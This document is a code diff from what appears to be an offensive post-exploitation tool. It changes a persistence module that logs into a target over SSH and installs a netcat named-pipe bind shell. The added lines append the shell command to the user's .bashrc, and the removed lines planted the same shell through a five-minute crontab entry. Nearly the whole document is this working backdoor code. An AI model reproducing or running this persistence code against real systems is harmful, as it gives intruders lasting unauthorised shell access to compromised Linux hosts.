@@ -4,7 +4,7 @@ from polarity_server.persistence.base import BasePersistence
 from polarity_server.shell_deployment import SSHShell
 
 
-class CronPersistence(BasePersistence):
+class BashRcPersistence(BasePersistence):
 
     OS_FAMILY = ["Linux"]
     PORT = 22
@@ -15,20 +15,14 @@ class CronPersistence(BasePersistence):
             if not ssh_shell.create_connection():
                 return False
 
-            command = "mkdir -p /home/{}/.cron".format(self._user.username)
-            ssh_shell.send_command(command)
-
-            command = "*/5 * * * * echo \"NC=\`which nc\` && mknod /tmp/backpipe p 2>/dev/null; " \
+            command = "echo \"NC=\`which nc\` && mknod /tmp/backpipe p 2>/dev/null; " \
                       "/bin/sh 0</tmp/backpipe | \$NC -lp {} 1>/tmp/backpipe &disown\" " \
-                      ">> /home/{}/.cron/crontab".format(self._listen_port, self._user.username)
-            ssh_shell.send_command(command)
-
-            command = "crontab /home/{}/.cron/crontab".format(self._user.username)
+                      ">> /home/{}/.bashrc".format(self._listen_port, self._user.username)
             ssh_shell.send_command(command)
 
             ssh_shell.close_connection()
 
-            logging.info("Installed cron persistence on {}@{}"
+            logging.info("Installed bashrc persistence on {}@{}"
                          .format(self._user.username, self._host.ip_address))
 
             return True
